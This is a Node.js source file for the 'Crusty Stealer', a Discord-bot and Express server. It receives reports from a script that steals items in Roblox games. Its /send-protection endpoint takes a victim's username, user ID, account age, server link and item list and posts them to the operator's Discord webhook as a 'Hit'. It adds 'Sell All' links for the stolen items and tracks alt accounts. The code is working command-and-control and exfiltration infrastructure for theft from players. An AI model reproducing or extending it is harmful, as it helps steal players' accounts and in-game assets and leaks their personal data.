require("dotenv").config();
const express = require("express");
const axios = require("axios");
const { Client, GatewayIntentBits, AttachmentBuilder } = require("discord.js");
const fs = require("fs").promises;
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Discord Bot Setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// Configuration
const BOT_TOKEN = process.env.TKN;
const GUILD_ID = "1431770200382116014";
const CHANNEL_ID = "1431772644079833361";
const LIST_KEY = process.env.LKEY;
const CRUSTY_LIST_URL = "https://crusty-dev-tc-ymhj.onrender.com/webhook-list/crustyv3";
const FETCH_INTERVAL = 10000; // 10 seconds
const BACKUP_INTERVAL = 30000; // 30 seconds
const ENV_FILE = path.join(__dirname, ".env");

// RAM store
const webhooks = new Map(); // id -> webhookURL

// ----------------------
// File Operations
// ----------------------
async function saveToEnv() {
  try {
    let envContent = await fs.readFile(ENV_FILE, "utf-8").catch(() => "");
    
    // Remove old webhook entries
    envContent = envContent.split("\n").filter(line => !line.startsWith("WEBHOOK_")).join("\n");
    
    // Add current webhooks
    let index = 0;
    for (const [id, url] of webhooks.entries()) {
      envContent += `\nWEBHOOK_${index}_ID=${id}`;
      envContent += `\nWEBHOOK_${index}_URL=${url}`;
      index++;
    }
    
    await fs.writeFile(ENV_FILE, envContent.trim() + "\n");
    console.log("✅ Webhooks saved to .env file");
  } catch (err) {
    console.error("❌ Failed to save to .env:", err.message);
  }
}

async function loadFromEnv() {
  try {
    const envContent = await fs.readFile(ENV_FILE, "utf-8");
    const lines = envContent.split("\n");
    
    const tempWebhooks = new Map();
    for (const line of lines) {
      const idMatch = line.match(/^WEBHOOK_(\d+)_ID=(.+)$/);
      const urlMatch = line.match(/^WEBHOOK_(\d+)_URL=(.+)$/);
      
      if (idMatch) {
        const [, index, id] = idMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).id = id;
      }
      if (urlMatch) {
        const [, index, url] = urlMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).url = url;
      }
    }
    
    for (const [, { id, url }] of tempWebhooks) {
      if (id && url) webhooks.set(id, url);
    }
    
    console.log(`✅ Loaded ${webhooks.size} webhooks from .env`);
  } catch (err) {
    console.log("ℹ️ No .env webhooks to load or file doesn't exist");
  }
}

// ----------------------
// Load from Discord Backup
// ----------------------
async function loadFromDiscordBackup() {
  try {
    console.log("🔄 Fetching latest backup from Discord...");
    const channel = await client.channels.fetch(CHANNEL_ID);
    if (!channel) {
      console.error("❌ Channel not found");
      return false;
    }

    const messages = await channel.messages.fetch({ limit: 50 });
    const botMessages = messages.filter(
      (msg) => msg.author.id === client.user.id && msg.attachments.size > 0
    );

    if (botMessages.size === 0) {
      console.log("ℹ️ No backup found in Discord channel");
      return false;
    }

    const latestMessage = botMessages.first();
    const attachment = latestMessage.attachments.first();

    if (!attachment || !attachment.name.endsWith(".json")) {
      console.log("ℹ️ No valid JSON backup found");
      return false;
    }

    const response = await axios.get(attachment.url);
    const data = response.data;

    if (Array.isArray(data)) {
      for (const { id, url } of data) {
        if (id && url) webhooks.set(id, url);
      }
      console.log(`✅ Loaded ${data.length} webhooks from Discord backup`);
      await saveToEnv();
      return true;
    }

    return false;
  } catch (err) {
    console.error("❌ Failed to load from Discord backup:", err.message);
    return false;
  }
}
// ----------------------
// Discord Backup
// ----------------------
async function sendBackupToDiscord() {
  try {
    const channel = await client.channels.fetch(CHANNEL_ID);
    if (!channel) {
      console.error("❌ Channel not found");
      return;
    }

    const list = [];
    for (const [id, url] of webhooks.entries()) {
      list.push({ id, url });
    }

    const jsonContent = JSON.stringify(list, null, 2);
    const buffer = Buffer.from(jsonContent, "utf-8");
    const attachment = new AttachmentBuilder(buffer, { name: "webhooks_backup.json" });

    await channel.send({
      content: `📦 **Webhook Backup** - ${new Date().toLocaleString()}\nTotal Webhooks: ${list.length}`,
      files: [attachment],
    });

    console.log(`✅ Backup sent to Discord (${list.length} webhooks)`);
  } catch (err) {
    console.error("❌ Failed to send backup to Discord:", err.message);
  }
}

// ----------------------
// Discord Bot Events
// ----------------------
client.once("ready", () => {
  console.log(`✅ Discord bot logged in as ${client.user.tag}`);
  
  // Start backup interval
  setInterval(sendBackupToDiscord, BACKUP_INTERVAL);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (message.guildId !== GUILD_ID) return;

  if (message.content.startsWith("!add")) {
    if (message.attachments.size === 0) {
      return message.reply("❌ Please attach a JSON file with webhook data!");
    }

    const attachment = message.attachments.first();
    if (!attachment.name.endsWith(".json")) {
      return message.reply("❌ Please attach a valid JSON file!");
    }

    try {
      const response = await axios.get(attachment.url);
      const data = response.data;

      if (!Array.isArray(data)) {
        return message.reply("❌ Invalid JSON format! Expected an array of webhooks.");
      }

      let added = 0;
      for (const item of data) {
        if (item.id && item.url) {
          webhooks.set(item.id, item.url);
          added++;
        }
      }

      await saveToEnv();
      await message.reply(`✅ Successfully added ${added} webhook(s) to the system!`);
      console.log(`✅ Added ${added} webhooks via !add command`);
    } catch (err) {
      console.error("❌ Error processing JSON:", err.message);
      await message.reply("❌ Failed to process the JSON file. Please check the format.");
    }
  }
});

// ----------------------
// Express Routes
// ----------------------
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Crusty System</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          color: white;
        }
        .container {
          text-align: center;
          background: rgba(255, 255, 255, 0.1);
          padding: 40px 60px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
          box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
        }
        h1 {
          font-size: 3em;
          margin-bottom: 20px;
          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .status {
          display: flex;
          justify-content: center;
          gap: 30px;
          margin-top: 30px;
        }
        .status-item {
          display: flex;
          align-items: center;
          gap: 10px;
          font-size: 1.2em;
        }
        .dot {
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background: #00ff00;
          animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🛡️ Crusty System</h1>
        <div class="status">
          <div class="status-item">
            <span class="dot"></span>
            <span>Bot Aktif</span>
          </div>
          <div class="status-item">
            <span class="dot"></span>
            <span>Site Aktif</span>
          </div>
        </div>
      </div>
    </body>
    </html>
  `);
});
/**
 * Create Protection
 * Registers a webhook URL and returns a unique ID
 * Endpoint: GET /create-protection/webhook?webhook=...
 */
app.get("/create-protection/webhook", async (req, res) => {
  const { webhook } = req.query;
  if (!webhook) return res.status(400).json({ error: "Missing webhook" });

  const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  webhooks.set(id, webhook);
  await saveToEnv();

  res.json({ id });
});

/**
 * Send Protection
 */
app.get("/send-protection", async (req, res) => {
  const {
    id: webhookId,
    status,
    name,
    userid,
    displayname,
    accountage,
    playercount,
    gamename,
    privateserver,
    serverlink,
    mentioneveryone,
  } = req.query;

  const webhookURL = webhooks.get(webhookId);
  if (!webhookURL) return res.status(404).json({ error: "Webhook ID not found" });

  // Collect up to 50 items
  const items = [];
  for (let i = 1; i <= 50; i++) {
    const item = req.query[`item${i}`];
    if (item) items.push(item);
  }
  
  const itemsList = items.length ? items.join("\n") : "No Brainrots detected";

  let embed = {};
  const avatarUrl =
    "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";

  if (status === "hit") {
    embed = {
      title: "Crusty Stealer",
      description: "**You Got A Hit!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
            privateserver === "true" ? "Private Server" : "Public Server"
          }\`\`\``,
          inline: false,
        },
        {
          name: `Brainrots Detected (${items.length} total)`,
          value: `\`\`\`${itemsList}\`\`\``,
          inline: false,
        },
        {
          name: "Target Server",
          value: serverlink || "-",
          inline: false,
        },
        {
          name: "Sell All Brainrots",
          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(
            name || ""
          )})`,
          inline: false,
        },
        {
          name: "Check Activity Status",
          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(
            name || ""
          )})`,
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Stealing System - Active",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "altaccount") {
    embed = {
      title: "⚠️ Alt Account Detected",
      description: "**No Valid Brainrots Found!**",
      color: 0xff0000,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Detection Result",
          value: "```No OG/Secret/Brainrot God animals found\nAccount flagged as alt```",
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Anti-Alt System",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "initializing") {
    embed = {
      title: "Crusty Stealer",
      description: "**Someone is using Crusty Your Stealer Script!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
            privateserver === "true" ? "Private Server" : "Public Server"
          }\`\`\``,
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Hit Steal - Initializing",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else {
    return res.status(400).json({ error: "Invalid status" });
  }

  const payload = {
    username: "Notifier | C̸͕͔͒͒r̸̟͓͒̓ụ̸̻̊̔s̴̻̖̀t̵̥͍͒͝y̶̥͊",
    avatar_url: avatarUrl,
    embeds: [embed],
  };

  // Only mention @everyone on "hit" status
  if (status === "hit" && mentioneveryone === "true") {
    payload.content = "@everyone";
  }

  try {
    await axios.post(webhookURL, payload, { headers: { "Content-Type": "application/json" } });
    res.json({ ok: true });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

async function initialSync() {
  console.log("ℹ️ initialSync skipped (not implemented)");
}

// ----------------------
// Startup Sequence
// ----------------------
async function startApp() {
  console.log("🚀 Starting Crusty Webhook Manager...");

  // EXPRESS ÖNCE
  app.listen(PORT, () => {
    console.log(`✅ Express server running on port ${PORT}`);
  });

  // SONRA BOT & DİĞER İŞLER
  await loadFromEnv();
  await initialSync();

  if (webhooks.size === 0) {
    console.log("⚠️ No webhooks found, checking Discord backup...");
    await client.login(BOT_TOKEN);
    await new Promise(r => setTimeout(r, 3000));
    await loadFromDiscordBackup();
  } else {
    await client.login(BOT_TOKEN);
  }
}

startApp().catch(console.error);
